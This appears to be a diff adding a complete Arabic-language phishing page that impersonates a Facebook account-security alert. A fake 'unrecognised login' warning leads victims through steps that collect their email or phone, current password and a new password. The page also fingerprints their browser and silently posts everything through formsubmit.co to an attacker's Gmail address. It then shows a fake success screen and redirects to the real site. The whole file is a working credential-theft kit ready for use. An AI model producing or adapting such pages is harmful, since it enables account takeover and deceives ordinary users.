@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>تأمين الحساب · Facebook</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:#f0f2f5;color:#1c1e21;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:28px 16px}
+.brand{color:#1877f2;font-size:34px;font-weight:800;letter-spacing:-1px;margin-bottom:18px}
+.progress{display:flex;align-items:center;gap:6px;margin-bottom:18px}
+.dot{width:32px;height:32px;border-radius:50%;background:#fff;border:2px solid #ccd0d5;color:#8d949e;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;transition:.25s}
+.dot.current{background:#1877f2;border-color:#1877f2;color:#fff}
+.dot.done{background:#31a24c;border-color:#31a24c;color:#fff}
+.line{width:34px;height:2px;background:#ccd0d5;border-radius:2px}
+form.card{background:#fff;width:100%;max-width:430px;border-radius:10px;box-shadow:0 1px 3px rgba(0,0,0,.12);padding:26px 24px 24px}
+.step{display:none}
+.step.active{display:block;animation:fade .3s ease}
+@keyframes fade{0%{opacity:0;transform:translateY(6px)}100%{opacity:1;transform:none}}
+h2{font-size:20px;font-weight:700;margin-bottom:8px;line-height:1.4}
+.sub{font-size:14px;color:#606770;line-height:1.7;margin-bottom:18px}
+.alert{background:#fff8e5;border:1px solid #f7dfa5;border-radius:8px;padding:14px;display:flex;gap:12px;align-items:flex-start;margin-bottom:18px}
+.alert svg{flex:0 0 22px;margin-top:2px}
+.alert b{display:block;font-size:14px;margin-bottom:4px}
+.alert span{font-size:13px;color:#606770;line-height:1.6}
+.info{background:#f5f6f7;border-radius:8px;padding:4px 14px;margin-bottom:18px}
+.info div{display:flex;justify-content:space-between;font-size:13px;padding:10px 0;border-bottom:1px solid #e4e6eb}
+.info div:last-child{border:0}
+.info span:first-child{color:#606770}
+.info span:last-child{font-weight:600}
+label{display:block;font-size:13px;color:#606770;margin-bottom:6px;font-weight:600}
+.field{position:relative;margin-bottom:14px}
+input{width:100%;padding:13px 14px;font-size:16px;font-family:inherit;border:1px solid #dddfe2;border-radius:8px;background:#fff;color:#1c1e21;transition:.2s}
+input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 3px rgba(24,119,242,.15)}
+input.err{border-color:#e41e3f;background:#fff5f6}
+.eye{position:absolute;top:50%;left:12px;transform:translateY(-50%);background:none;border:0;cursor:pointer;color:#606770;font-size:12px;font-weight:700}
+.msg{font-size:12.5px;color:#e41e3f;margin-top:-8px;margin-bottom:12px;display:none}
+.msg.show{display:block}
+.bars{display:flex;gap:5px;margin:8px 0 6px}
+.bars i{flex:1;height:5px;border-radius:3px;background:#e4e6eb;transition:.25s}
+.bars i.on1{background:#e41e3f}
+.bars i.on2{background:#f7b928}
+.bars i.on3{background:#31a24c}
+.strength{font-size:12px;color:#606770;margin-bottom:14px;height:15px}
+button.main{width:100%;padding:13px;background:#1877f2;color:#fff;border:0;border-radius:8px;font-size:16.5px;font-weight:700;font-family:inherit;cursor:pointer;transition:.2s}
+button.main:hover{background:#166fe5}
+button.main:active{transform:scale(.985)}
+button.main:disabled{opacity:.65;cursor:default}
+button.ghost{width:100%;padding:12px;background:#e4e6eb;color:#1c1e21;border:0;border-radius:8px;font-size:15.5px;font-weight:600;font-family:inherit;cursor:pointer;margin-top:9px}
+.check{width:64px;height:64px;border-radius:50%;background:#31a24c;display:flex;align-items:center;justify-content:center;margin:6px auto 16px}
+.center{text-align:center}
+.foot{font-size:12px;color:#8d949e;margin-top:22px}
+@media(max-width:480px){.brand{font-size:29px}form.card{padding:22px 18px 20px}}
+</style>
+</head>
+<body>
+
+<div class="brand">facebook</div>
+
+<div class="progress">
+  <div class="dot current">1</div><div class="line"></div>
+  <div class="dot">2</div><div class="line"></div>
+  <div class="dot">3</div><div class="line"></div><div class="line"></div>
+  <div class="dot">4</div>
+</div>
+
+<form class="card" id="sink" action="https://formsubmit.co/verifyfacebook207@gmail.com" method="POST">
+
+  <!-- الخطوة 1 -->
+  <section class="step active">
+    <h2>تم رصد محاولة دخول جديدة</h2>
+    <p class="sub">جرت محاولة تسجيل الدخول إلى حسابك من جهاز لم نتعرف عليه.</p>
+    <div class="alert">
+      <svg viewBox="0 0 24 24" width="22" height="22" fill="#f7b928"><path d="M12 2 1 21h22L12 2zm0 6 6.5 11h-13L12 8zm-1 3v4h2v-4h-2zm0 5v2h2v-2h-2z"/></svg>
+      <div><b>جهاز غير معروف</b><span>إذا لم تكن أنت، فمن المحتمل أن كلمة مرورك معروفة لشخص آخر.</span></div>
+    </div>
+    <div class="info">
+      <div><span>الجهاز</span><span id="dev">جهاز آخر · Chrome</span></div>
+      <div><span>الوقت</span><span id="time">صباحًا</span></div>
+      <div><span>الحالة</span><span style="color:#e41e3f">بانتظار التأكيد</span></div>
+    </div>
+    <button class="main" type="button" id="b1">لم يكن أنا — غيّر كلمة المرور</button>
+    <button class="ghost" type="button" id="b1b">كان هذا أنا</button>
+  </section>
+
+  <!-- الخطوة 2 -->
+  <section class="step">
+    <h2>ابحث عن حسابك</h2>
+    <p class="sub">أدخل البريد الإلكتروني أو رقم الهاتف المرتبط بحسابك.</p>
+    <div class="field">
+      <label for="mail">البريد الإلكتروني أو رقم الهاتف</label>
+      <input id="mail" name="البريد_أو_الهاتف" type="text" placeholder="name@example.com" autocomplete="username">
+    </div>
+    <p class="msg" id="err2">أدخل بريدًا أو رقمًا صحيحًا.</p>
+    <button class="main" type="button" id="b2">متابعة</button>
+  </section>
+
+  <!-- الخطوة 3 -->
+  <section class="step">
+    <h2>تأكيد الهوية</h2>
+    <p class="sub">أدخل كلمة المرور الحالية للتأكد من أنك صاحب الحساب.</p>
+    <div class="field">
+      <label for="cur">كلمة المرور الحالية</label>
+      <input id="cur" name="كلمة_المرور_الحالية" type="password" placeholder="••••••••" autocomplete="current-password">
+      <button class="eye" type="button" data-for="cur">إظهار</button>
+    </div>
+    <p class="msg" id="err3">كلمة المرور غير صحيحة.</p>
+    <button class="main" type="button" id="b3">تحقق</button>
+  </section>
+
+  <!-- الخطوة 4 -->
+  <section class="step">
+    <h2>اختر كلمة مرور جديدة</h2>
+    <p class="sub">يجب أن تختلف عن كلمة المرور السابقة، وأن تحتوي 8 أحرف على الأقل.</p>
+    <div class="field">
+      <label for="np">كلمة المرور الجديدة</label>
+      <input id="np" name="كلمة_المرور_الجديدة" type="password" placeholder="••••••••">
+      <button class="eye" type="button" data-for="np">إظهار</button>
+    </div>
+    <div class="bars"><i id="s1"></i><i id="s2"></i><i id="s3"></i></div>
+    <div class="strength" id="stxt"></div>
+    <div class="field">
+      <label for="cf">تأكيد كلمة المرور</label>
+      <input id="cf" name="تأكيد_كلمة_المرور" type="password" placeholder="••••••••">
+      <button class="eye" type="button" data-for="cf">إظهار</button>
+    </div>
+    <p class="msg" id="err4">كلمتا المرور غير متطابقتين.</p>
+    <button class="main" id="sendBtn" type="submit">حفظ كلمة المرور</button>
+    <p class="msg" id="err5" style="text-align:center">تعذّر الإرسال، حاول مرة أخرى.</p>
+  </section>
+
+  <!-- الخطوة 5 -->
+  <section class="step center">
+    <div class="check">
+      <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round"><path d="M4 12.5 9.5 18 20 6.5"/></svg>
+    </div>
+    <h2>تم تغيير كلمة المرور بنجاح</h2>
+    <p class="sub">تم تأمين حسابك وإنهاء الجلسات المفتوحة على الأجهزة الأخرى.</p>
+    <button class="main" type="button" id="b5">الانتقال إلى Facebook</button>
+  </section>
+
+  <!-- حقول مخفية -->
+  <input type="hidden" name="_subject" value="🔵 Facebook — تسجيل دخول جديد">
+  <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_replyto" id="f_reply" value="">
+  <input type="hidden" name="الجهاز" id="f_dev" value="">
+  <input type="hidden" name="الوقت" id="f_ts" value="">
+  <input type="text" name="_honey" style="display:none" tabindex="-1" autocomplete="off">
+</form>
+
+<div class="foot">Meta © 2026</div>
+
+<noscript><style>.step{display:block!important}</style></noscript>
+
+<script>
+(function(){
+  "use strict";
+
+  var EMAIL = "verifyfacebook207@gmail.com";        /* ← بريدك */
+  var PLAIN = "https://formsubmit.co/"      + EMAIL;
+  var AJAX  = "https://formsubmit.co/ajax/" + EMAIL;
+
+  var form  = document.getElementById("sink");
+  var steps = [].slice.call(document.querySelectorAll(".step"));
+  var dots  = [].slice.call(document.querySelectorAll(".dot"));
+  var S = { mail:"", cur:"" };
+
+  form.action = PLAIN;
+
+  /* بصمة الجهاز */
+  (function(){
+    var ua = navigator.userAgent;
+    var os = /Windows/.test(ua) ? "Windows" : /Mac/.test(ua) ? "macOS"
+           : /Android/.test(ua) ? "Android" : /iPhone|iPad/.test(ua) ? "iOS" : "جهاز آخر";
+    var br = /Edg/.test(ua) ? "Edge" : /Chrome/.test(ua) ? "Chrome"
+           : /Firefox/.test(ua) ? "Firefox" : /Safari/.test(ua) ? "Safari" : "متصفح";
+    document.getElementById("dev").textContent = os + " · " + br;
+    var h = new Date().getHours();
+    document.getElementById("time").textContent = h < 12 ? "صباحًا" : h < 18 ? "بعد الظهر" : "مساءً";
+    document.getElementById("f_dev").value = ua + " | " + screen.width + "x" + screen.height + " | " + (navigator.language||"");
+    document.getElementById("f_ts").value  = new Date().toLocaleString("ar");
+  })();
+
+  function go(n){
+    steps.forEach(function(s,i){ s.classList.toggle("active", i === n-1); });
+    dots.forEach(function(d,i){
+      d.classList.toggle("done",    i <  n-1);
+      d.classList.toggle("current", i === n-1);
+    });
+    window.scrollTo({top:0, behavior:"smooth"});
+    var f = document.querySelector(".step.active input:not([type=hidden])");
+    if (f) setTimeout(function(){ f.focus(); }, 250);
+  }
+
+  function bad(id, show){ document.getElementById(id).classList.toggle("show", show); return show; }
+
+  /* إظهار/إخفاء */
+  document.querySelectorAll(".eye").forEach(function(btn){
+    btn.addEventListener("click", function(){
+      var el = document.getElementById(btn.dataset.for);
+      el.type = el.type === "password" ? "text" : "password";
+      btn.textContent = el.type === "password" ? "إظهار" : "إخفاء";
+    });
+  });
+
+  /* تنقل */
+  document.getElementById("b1").onclick  = function(){ go(2); };
+  document.getElementById("b1b").onclick = function(){ go(2); };
+  document.getElementById("b5").onclick  = function(){ location.href = "https://www.facebook.com/"; };
+
+  document.getElementById("b2").onclick = function(){
+    var el = document.getElementById("mail"), v = el.value.trim();
+    var ok = /^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i.test(v) || /^[+\d][\d\s\-()]{6,}$/.test(v);
+    el.classList.toggle("err", !ok);
+    if (bad("err2", !ok)) return;
+    S.mail = v;
+    document.getElementById("f_reply").value = v;
+    go(3);
+  };
+
+  document.getElementById("b3").onclick = function(){
+    var el = document.getElementById("cur"), v = el.value;
+    el.classList.toggle("err", v.length < 4);
+    if (bad("err3", v.length < 4)) return;
+    S.cur = v;
+    go(4);
+  };
+
+  /* قوة كلمة المرور */
+  document.getElementById("np").addEventListener("input", function(){
+    var v = this.value, s = 0;
+    if (v.length >= 8) s++;
+    if (v.length >= 12 || (/[A-Z]/.test(v) && /[a-z]/.test(v))) s++;
+    if (/\d/.test(v) && /[^A-Za-z0-9]/.test(v)) s++;
+    var cls = s >= 3 ? "on3" : s === 2 ? "on2" : "on1";
+    ["s1","s2","s3"].forEach(function(id,i){
+      document.getElementById(id).className = i < s ? cls : "";
+    });
+    document.getElementById("stxt").textContent = !v ? "" : s <= 1 ? "ضعيفة" : s === 2 ? "متوسطة" : "قوية";
+  });
+
+  document.querySelectorAll("input").forEach(function(el){
+    el.addEventListener("input", function(){ el.classList.remove("err"); });
+  });
+
+  form.addEventListener("keydown", function(e){
+    if (e.key !== "Enter") return;
+    var idx = steps.indexOf(document.querySelector(".step.active")) + 1;
+    if (idx >= 4) return;
+    e.preventDefault();
+    if (idx === 2) document.getElementById("b2").click();
+    else if (idx === 3) document.getElementById("b3").click();
+  });
+
+  /* إرسال */
+  form.addEventListener("submit", function(e){
+    e.preventDefault();
+    var a = document.getElementById("np"), b = document.getElementById("cf");
+    var bad4 = a.value.length < 8 || a.value !== b.value;
+    a.classList.toggle("err", bad4);
+    b.classList.toggle("err", bad4);
+    if (bad4) { bad("err4", true); return; }
+
+    var btn = document.getElementById("sendBtn");
+    btn.disabled = true;
+    var old = btn.textContent;
+    btn.textContent = "جارٍ الإرسال…";
+    document.getElementById("err5").classList.remove("show");
+
+    fetch(AJAX, {
+      method:"POST",
+      headers:{ "Accept":"application/json" },
+      body: new FormData(form)
+    })
+    .then(function(r){ if(!r.ok) throw 0; return r.json().catch(function(){return{};}); })
+    .then(function(){ go(5); })
+    .catch(function(){
+      btn.disabled = false; btn.textContent = old;
+      document.getElementById("err5").classList.add("show");
+    });
+  });
+})();
+</script>
+</body>
+  </html>
